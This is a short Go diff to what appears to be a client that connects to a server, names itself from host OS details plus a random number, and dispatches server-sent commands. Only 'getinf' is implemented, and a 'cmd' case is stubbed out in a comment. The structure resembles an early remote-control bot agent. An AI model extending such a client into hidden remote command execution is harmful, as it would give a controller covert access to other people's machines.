@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"strings"
 
 	gi "github.com/matishsiao/goInfo"
 )
@@ -15,19 +16,16 @@ func Getnick() string {
 	return fmt.Sprintf("%s_%d", temp.GoOS, rand)
 }
 
+//HandleCommand ...
 func HandleCommand(c net.Conn, message string) {
-	switch message {
+	fullCommand := strings.Split(message, " ")
+	switch fullCommand[0] {
 
 	case "getinf":
 		go getInf(c)
 		break
+	// case "cmd"
 	}
-}
-
-// SendToServer sends a message to server
-func sendToServer(c net.Conn, msg string) (err error) {
-	_, err = c.Write([]byte(msg))
-	return
 }
 
 func getInf(c net.Conn) {
